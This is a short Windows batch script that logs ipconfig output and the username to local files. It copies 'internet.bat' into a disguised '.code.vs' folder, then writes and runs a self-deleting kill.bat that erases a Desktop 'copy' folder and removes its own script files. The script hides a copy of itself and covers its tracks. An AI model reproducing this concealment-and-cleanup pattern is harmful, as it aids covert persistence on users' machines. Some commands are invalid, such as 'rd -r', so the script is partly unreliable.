@echo off 
echo hello, runing now 
ipconfig 
ipconfig >> C:\Users\%username%\Desktop\workforconputer\workspace\%username%.txt 
cls
echo done 
echo System= %username% >> C:\Users\%username%\lock.txt
echo done 
md "C:\Users\%username%\.code.vs"
copy "internet.bat" "C:\Users\%username%\.code.vs"
cls
echo @echo off >> c:\Users\%username%\desktop\kill.bat
echo rd -r C:\Users\%username%\Desktop\copy >>c:\Users\%username%\desktop\kill.bat 
echo pause >> c:\Users\%username%\desktop\kill.bat
echo rd -r C:\Users\%username%\Desktop\copy >>c:\Users\%username%\desktop\kill.bat  
echo del kill.bat >> c:\Users\%username%\desktop\kill.bat
echo done 
del c:\Users\%username%\desktop\copy\internet.bat
start c:\Users\%username%\desktop\kill.bat
del c:\Users\%username%\desktop\copy\E.bat
exit 